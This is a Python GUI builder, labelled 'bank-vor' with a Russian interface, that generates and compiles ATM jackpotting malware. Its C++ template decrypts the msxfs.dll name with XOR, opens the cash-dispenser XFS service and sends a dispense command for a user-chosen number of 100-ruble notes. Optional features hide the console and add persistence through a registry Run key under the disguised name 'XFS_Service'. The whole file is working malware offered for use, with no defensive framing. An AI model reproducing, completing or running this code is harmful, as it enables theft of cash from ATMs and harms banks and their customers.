import tkinter as tk
from tkinter import ttk, messagebox
import os
import subprocess
import threading

CPP_TEMPLATE = """
#include <windows.h>

#define WFS_SUCCESS 0
#define WFS_CMD_CDM_DISPENSE 302

unsigned char enc_msxfs[] = { 0x2F, 0x31, 0x3A, 0x24, 0x31, 0x6C, 0x26, 0x2E, 0x2E, 0x42 };

void DecryptMsxfs(char* out) {
    for (int i = 0; i < 10; i++) out[i] = enc_msxfs[i] ^ 0x42;
}

typedef DWORD (WINAPI *WFSStartUp_t)(DWORD, LPVOID);
typedef DWORD (WINAPI *WFSOpen_t)(LPSTR, DWORD, DWORD, DWORD, LPVOID, LPHANDLE);
typedef DWORD (WINAPI *WFSExecute_t)(HANDLE, DWORD, LPVOID, DWORD, LPVOID*);

struct WFSCDMDISPENSE {
    USHORT usNumber;
    USHORT usCashUnit;
    BOOL bPresent;
};

void SetAutoStart() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "XFS_Service", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    %s
    %s

    char dllName[12] = {0};
    DecryptMsxfs(dllName);
    HMODULE hXfs = LoadLibraryA(dllName);
    if (!hXfs) return -1;

    WFSStartUp_t WFSStartUp = (WFSStartUp_t)GetProcAddress(hXfs, "WFSStartUp");
    WFSOpen_t WFSOpen = (WFSOpen_t)GetProcAddress(hXfs, "WFSOpen");
    WFSExecute_t WFSExecute = (WFSExecute_t)GetProcAddress(hXfs, "WFSExecute");

    if (!WFSStartUp || !WFSOpen || !WFSExecute) { FreeLibrary(hXfs); return -2; }

    DWORD version = 0x00030203;
    if (WFSStartUp(version, NULL) != WFS_SUCCESS) { FreeLibrary(hXfs); return -3; }

    HANDLE hService = NULL;
    if (WFSOpen((LPSTR)"CDM1", 0, version, 0, NULL, &hService) != WFS_SUCCESS) {
        const char* names[] = {"CDM2", "CDM3", "CashDispenser", "NCR_CDM"};
        bool opened = false;
        for (int i = 0; i < 4; i++) {
            if (WFSOpen((LPSTR)names[i], 0, version, 0, NULL, &hService) == WFS_SUCCESS) { opened = true; break; }
        }
        if (!opened) { FreeLibrary(hXfs); return -4; }
    }

    WFSCDMDISPENSE cmd;
    cmd.usNumber = %d; 
    cmd.usCashUnit = %d; 
    cmd.bPresent = TRUE;

    LPVOID resultData = NULL;
    DWORD res = WFSExecute(hService, WFS_CMD_CDM_DISPENSE, &cmd, 10000, &resultData);

    FreeLibrary(hXfs);
    return (res == WFS_SUCCESS) ? 0 : -5;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return main();
}
"""

class BuilderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("bank-vor | Regulator Edition")
        self.root.geometry("500x560")
        self.root.configure(bg="#1e1e1e")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#1e1e1e", foreground="#ffffff", font=("Arial", 10))
        style.configure("TButton", font=("Arial", 10, "bold"), padding=5)
        style.configure("Horizontal.TScale", background="#1e1e1e", troughcolor="#333")
        
        tk.Label(root, text="BANK-VOR 100₽", font=("Arial", 20, "bold"), bg="#1e1e1e", fg="#00ff00").pack(pady=10)

        # РЕГУЛИРОВКА СУММЫ
        frame_slider = tk.Frame(root, bg="#1e1e1e")
        frame_slider.pack(pady=10, fill="x", padx=20)
        
        ttk.Label(frame_slider, text="Регулировка суммы выдачи (только сотки):").pack(anchor="w")
        
        self.slider_var = tk.IntVar(value=1000)
        self.slider = ttk.Scale(frame_slider, from_=100, to=5000, orient="horizontal", variable=self.slider_var, command=self.on_slide)
        self.slider.pack(fill="x", pady=5)

        self.lbl_amount = ttk.Label(root, text="Сумма: 1000 ₽", font=("Arial", 14, "bold"), foreground="#00ff00")
        self.lbl_amount.pack()
        
        self.lbl_bills = ttk.Label(root, text="Купюр по 100₽: 10 шт.", font=("Arial", 12), foreground="#aaaaaa")
        self.lbl_bills.pack()

        # Кассета
        frame_unit = tk.Frame(root, bg="#1e1e1e")
        frame_unit.pack(pady=10)
        ttk.Label(frame_unit, text="Номер кассеты с сотками:").pack(side=tk.LEFT, padx=5)
        self.entry_unit = tk.Entry(frame_unit, width=5, bg="#333", fg="#fff", insertbackground="#fff")
        self.entry_unit.insert(0, "0")
        self.entry_unit.pack(side=tk.LEFT)

        # Компилятор
        frame_comp = tk.Frame(root, bg="#1e1e1e")
        frame_comp.pack(pady=5)
        ttk.Label(frame_comp, text="Компилятор:").pack(side=tk.LEFT, padx=5)
        self.comp_var = tk.StringVar(value="MSVC (cl.exe)")
        ttk.Combobox(frame_comp, textvariable=self.comp_var, values=["MSVC (cl.exe)", "MinGW (g++)"], state="readonly", width=15).pack(side=tk.LEFT)

        # Формат
        frame_format = tk.Frame(root, bg="#1e1e1e")
        frame_format.pack(pady=5)
        ttk.Label(frame_format, text="Формат:").pack(side=tk.LEFT, padx=5)
        self.format_var = tk.StringVar(value="EXE")
        ttk.Combobox(frame_format, textvariable=self.format_var, values=["EXE", "DLL"], state="readonly", width=10).pack(side=tk.LEFT)

        # Функции
        frame_func = tk.LabelFrame(root, text="Функции", bg="#1e1e1e", fg="#fff")
        frame_func.pack(pady=10, fill="x", padx=20)
        
        self.var_autostart = tk.BooleanVar(value=True)
        self.var_hide = tk.BooleanVar(value=True)
        
        tk.Checkbutton(frame_func, text="Автозапуск (Реестр)", variable=self.var_autostart, bg="#1e1e1e", fg="#fff", selectcolor="#333").pack(anchor="w", padx=10)
        tk.Checkbutton(frame_func, text="Скрыть консоль", variable=self.var_hide, bg="#1e1e1e", fg="#fff", selectcolor="#333").pack(anchor="w", padx=10)

        # Кнопки
        btn_frame = tk.Frame(root, bg="#1e1e1e")
        btn_frame.pack(pady=10)
        
        self.btn_build = tk.Button(btn_frame, text="СОБРАТЬ", bg="#ff3333", fg="#fff", font=("Arial", 12, "bold"), width=15, command=self.start_build_thread)
        self.btn_build.pack(side=tk.LEFT, padx=5)
        
        self.btn_run = tk.Button(btn_frame, text="ЗАПУСТИТЬ CMD", bg="#333", fg="#00ff00", font=("Arial", 10, "bold"), command=self.run_via_cmd, state="disabled")
        self.btn_run.pack(side=tk.LEFT, padx=5)

        # Лог
        self.log_text = tk.Text(root, height=5, bg="#000", fg="#00ff00", font=("Consolas", 9))
        self.log_text.pack(fill="both", expand=True, padx=20, pady=10)

        self.on_slide()

    def on_slide(self, event=None):
        raw_val = int(self.slider_var.get())
        rounded_val = (raw_val // 100) * 100
        if rounded_val < 100: rounded_val = 100
        
        self.slider_var.set(rounded_val)
        
        count = rounded_val // 100
        self.lbl_amount.config(text=f"Сумма: {rounded_val} ₽")
        self.lbl_bills.config(text=f"Купюр по 100₽: {count} шт.")

    def log(self, msg):
        self.log_text.insert(tk.END, msg + "\n")
        self.log_text.see(tk.END)

    def run_via_cmd(self):
        fmt = self.format_var.get()
        exe_name = "bank-vor.exe" if fmt == "EXE" else "bank-vor.dll"
        if not os.path.exists(exe_name):
            messagebox.showerror("Ошибка", f"Файл {exe_name} не найден.")
            return
        self.log(f"[*] Запуск {exe_name} через CMD...")
        subprocess.Popen(f'start /wait cmd /c "{exe_name}"', shell=True)

    def start_build_thread(self):
        self.btn_build.config(state="disabled")
        self.btn_run.config(state="disabled")
        threading.Thread(target=self.build, daemon=True).start()

    def build(self):
        try:
            total_rub = int(self.slider_var.get())
            count = total_rub // 100
            unit = int(self.entry_unit.get())
            
            hide_cmd = "ShowWindow(GetConsoleWindow(), SW_HIDE);" if self.var_hide.get() else ""
            autostart_cmd = "SetAutoStart();" if self.var_autostart.get() else ""
            
            code = CPP_TEMPLATE % (hide_cmd, autostart_cmd, count, unit)

            with open("main.cpp", "w", encoding="utf-8") as f:
                f.write(code)
            self.log("[+] main.cpp сгенерирован.")

            compiler = self.comp_var.get()
            output_format = self.format_var.get()
            
            if output_format == "EXE":
                out_name = "bank-vor.exe"
                link_flags = "/SUBSYSTEM:WINDOWS" if self.var_hide.get() else "/SUBSYSTEM:CONSOLE"
                if compiler == "MSVC (cl.exe)":
                    cmd = f"cl /MT /O2 /EHsc main.cpp /link /OUT:{out_name} {link_flags}"
                else:
                    cmd = f"g++ -O2 -static main.cpp -o {out_name} -mwindows" if self.var_hide.get() else f"g++ -O2 -static main.cpp -o {out_name}"
            else:
                out_name = "bank-vor.dll"
                if compiler == "MSVC (cl.exe)":
                    cmd = f"cl /MT /O2 /EHsc /LD main.cpp /link /OUT:{out_name}"
                else:
                    cmd = f"g++ -O2 -static -shared main.cpp -o {out_name}"

            self.log(f"[*] Запуск компилятора: {compiler}")
            process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if process.returncode == 0:
                self.log(f"[+] УСПЕХ! Файл {out_name} собран.")
                messagebox.showinfo("Успех", f"Файл {out_name} успешно собран!\nВылетит {count} купюр по 100₽.")
                self.btn_run.config(state="normal")
            else:
                self.log(f"[-] Ошибка сборки:\n{process.stderr}")
                messagebox.showerror("Ошибка", "Сборка не удалась.")

        except Exception as e:
            self.log(f"[-] Ошибка: {str(e)}")
        finally:
            self.btn_build.config(state="normal")

if __name__ == "__main__":
    root = tk.Tk()
    app = BuilderApp(root)
    root.mainloop()
